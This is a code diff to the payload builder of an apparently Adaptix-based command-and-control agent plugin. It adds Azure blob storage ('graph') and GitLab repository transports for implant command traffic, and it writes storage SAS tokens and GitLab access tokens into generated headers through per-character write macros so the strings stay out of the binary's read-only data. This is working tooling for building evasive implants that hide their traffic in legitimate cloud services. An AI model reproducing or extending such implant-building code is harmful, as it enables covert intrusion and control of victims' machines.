@@ -321,6 +321,63 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	debugMode := getStr(args, "debug", "false")
 	isBind    := strings.HasPrefix(tcpMode, "bind")
 	isHttps   := strings.HasPrefix(tcpMode, "https")
+	isGraph   := false
+	isGitLab  := false
+	if len(profile.ListenerProfiles) > 0 {
+		var lpCfgCheck map[string]any
+		if err3 := json.Unmarshal(profile.ListenerProfiles[0].Profile, &lpCfgCheck); err3 == nil {
+			if v, ok := lpCfgCheck["storage_type"].(string); ok && v != "" {
+				isGraph = true
+			}
+			if v, ok := lpCfgCheck["gitlab_url"].(string); ok && v != "" {
+				isGitLab = true
+			}
+		}
+	}
+
+	// Graph transport parameters — extracted from listener config
+	graphAccount   := ""
+	graphContainer := ""
+	graphSasToken  := ""
+	graphPollMs    := 3000
+	graphPollMax   := 15
+	if isGraph && len(profile.ListenerProfiles) > 0 {
+		var lpCfg map[string]any
+		if err3 := json.Unmarshal(profile.ListenerProfiles[0].Profile, &lpCfg); err3 == nil {
+			if v, ok := lpCfg["storage_account"].(string); ok { graphAccount = v }
+			if v, ok := lpCfg["container_name"].(string); ok  { graphContainer = v }
+			if v, ok := lpCfg["sas_token"].(string); ok       { graphSasToken = v }
+			if v, ok := lpCfg["poll_interval_ms"].(float64); ok && v > 0 { graphPollMs = int(v) }
+			if v, ok := lpCfg["poll_attempts"].(float64); ok && v > 0    { graphPollMax = int(v) }
+		}
+		if graphAccount == "" || graphContainer == "" || graphSasToken == "" {
+			return nil, "", fmt.Errorf("graph mode requires storage_account, container_name and sas_token from the listener config")
+		}
+	}
+
+	// GitLab transport parameters — extracted from listener config
+	gitlabURL     := "https://gitlab.com"
+	gitlabToken   := ""
+	gitlabProject := ""
+	gitlabBranch  := "main"
+	gitlabPath    := ""
+	gitlabPollMs  := 3000
+	gitlabPollMax := 15
+	if isGitLab && len(profile.ListenerProfiles) > 0 {
+		var lpCfg map[string]any
+		if err3 := json.Unmarshal(profile.ListenerProfiles[0].Profile, &lpCfg); err3 == nil {
+			if v, ok := lpCfg["gitlab_url"].(string); ok && v != ""    { gitlabURL = v }
+			if v, ok := lpCfg["access_token"].(string); ok && v != ""  { gitlabToken = v }
+			if v, ok := lpCfg["project_id"].(string); ok && v != ""    { gitlabProject = v }
+			if v, ok := lpCfg["branch"].(string); ok && v != ""        { gitlabBranch = v }
+			if v, ok := lpCfg["repo_path"].(string); ok                { gitlabPath = v }
+			if v, ok := lpCfg["poll_interval_ms"].(float64); ok && v > 0 { gitlabPollMs = int(v) }
+			if v, ok := lpCfg["poll_attempts"].(float64); ok && v > 0    { gitlabPollMax = int(v) }
+		}
+		if gitlabToken == "" || gitlabProject == "" {
+			return nil, "", fmt.Errorf("gitlab mode requires access_token and project_id from the listener config")
+		}
+	}
 
 	naxRoot, err := getNaxRoot(modDir)
 	if err != nil {
@@ -336,8 +393,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	naxDebug := "0"
 	if debugMode == "true" || debugMode == "1" { naxDebug = "1" }
 
-	// Generate nax_config.h with volatile write macros
-	if isHttps || !isBind {
+	// Generate nax_config.h with volatile write macros (TCP/HTTPS transports only)
+	// Graph and GitLab write their own nax_config.h further below.
+	if (isHttps || !isBind) && !isGraph && !isGitLab {
 		c2PortInt := 4444
 		if p, err2 := strconv.Atoi(listenerC2Port); err2 == nil { c2PortInt = p }
 		c2h := listenerC2Host
@@ -379,6 +437,11 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	suffix := ""
 	if isBind {
+		// Remove any leftover nax_config.h from a previous graph/gitlab/https
+		// build — it may contain NAX_SLEEP_MS=0 which would override the value
+		// passed via -D on the command line and cause the bind agent to
+		// busy-loop sending heartbeats to the parent.
+		_ = os.Remove(filepath.Join(srcDir, "include", "nax_config.h"))
 		makeArgs = append(makeArgs, "NAX_TCP_MODE=bind",
 			fmt.Sprintf("NAX_BIND_PORT=%s", listenerBindPort))
 		suffix = "_bind"
@@ -415,6 +478,54 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			fmt.Sprintf("NAX_SLEEP_MS=%d", sleepMs),
 			fmt.Sprintf("NAX_JITTER_PCT=%d", jitterPct))
 		suffix = "_https"
+	} else if isGraph {
+		// Write graph config to nax_config.h using volatile per-char write
+		// macros so sensitive strings don't appear in .rodata of the binary.
+		var gbuf bytes.Buffer
+		gbuf.WriteString("/* nax_config.h — graph transport (generated) */\n")
+		gbuf.WriteString("#pragma once\n\n")
+		writeNaxCharWriteMacro(&gbuf, "NAX_GRAPH_ACCOUNT_WRITE", graphAccount)
+		fmt.Fprintf(&gbuf, "#define NAX_GRAPH_ACCOUNT_LEN %du\n\n", len(graphAccount))
+		writeNaxCharWriteMacro(&gbuf, "NAX_GRAPH_CONTAINER_WRITE", graphContainer)
+		fmt.Fprintf(&gbuf, "#define NAX_GRAPH_CONTAINER_LEN %du\n\n", len(graphContainer))
+		writeNaxCharWriteMacro(&gbuf, "NAX_GRAPH_SAS_TOKEN_WRITE", graphSasToken)
+		fmt.Fprintf(&gbuf, "#define NAX_GRAPH_SAS_TOKEN_LEN %du\n\n", len(graphSasToken))
+		fmt.Fprintf(&gbuf, "#define NAX_GRAPH_POLL_MS    %d\n", graphPollMs)
+		fmt.Fprintf(&gbuf, "#define NAX_GRAPH_POLL_MAX   %d\n", graphPollMax)
+		fmt.Fprintf(&gbuf, "#define NAX_SLEEP_MS         %d\n", sleepMs)
+		fmt.Fprintf(&gbuf, "#define NAX_JITTER_PCT       %d\n", jitterPct)
+		configPath := filepath.Join(srcDir, "include", "nax_config.h")
+		_ = os.WriteFile(configPath, gbuf.Bytes(), 0644)
+		makeArgs = append(makeArgs, "NAX_TCP_MODE=graph",
+			fmt.Sprintf("NAX_SLEEP_MS=%d", sleepMs),
+			fmt.Sprintf("NAX_JITTER_PCT=%d", jitterPct))
+		suffix = "_graph"
+	} else if isGitLab {
+		// Write gitlab config to nax_config.h using volatile per-char write
+		// macros so sensitive strings don't appear in .rodata of the binary.
+		var glbuf bytes.Buffer
+		glbuf.WriteString("/* nax_config.h — gitlab transport (generated) */\n")
+		glbuf.WriteString("#pragma once\n\n")
+		writeNaxCharWriteMacro(&glbuf, "NAX_GITLAB_URL_WRITE", gitlabURL)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_URL_LEN %du\n\n", len(gitlabURL))
+		writeNaxCharWriteMacro(&glbuf, "NAX_GITLAB_TOKEN_WRITE", gitlabToken)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_TOKEN_LEN %du\n\n", len(gitlabToken))
+		writeNaxCharWriteMacro(&glbuf, "NAX_GITLAB_PROJECT_WRITE", gitlabProject)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_PROJECT_LEN %du\n\n", len(gitlabProject))
+		writeNaxCharWriteMacro(&glbuf, "NAX_GITLAB_BRANCH_WRITE", gitlabBranch)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_BRANCH_LEN %du\n\n", len(gitlabBranch))
+		writeNaxCharWriteMacro(&glbuf, "NAX_GITLAB_REPO_PATH_WRITE", gitlabPath)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_REPO_PATH_LEN %du\n\n", len(gitlabPath))
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_POLL_MS   %d\n", gitlabPollMs)
+		fmt.Fprintf(&glbuf, "#define NAX_GITLAB_POLL_MAX  %d\n", gitlabPollMax)
+		fmt.Fprintf(&glbuf, "#define NAX_SLEEP_MS         %d\n", sleepMs)
+		fmt.Fprintf(&glbuf, "#define NAX_JITTER_PCT       %d\n", jitterPct)
+		configPath := filepath.Join(srcDir, "include", "nax_config.h")
+		_ = os.WriteFile(configPath, glbuf.Bytes(), 0644)
+		makeArgs = append(makeArgs, "NAX_TCP_MODE=gitlab",
+			fmt.Sprintf("NAX_SLEEP_MS=%d", sleepMs),
+			fmt.Sprintf("NAX_JITTER_PCT=%d", jitterPct))
+		suffix = "_gitlab"
 	} else {
 		c2h := listenerC2Host
 		if c2h == "" { c2h = "127.0.0.1" }
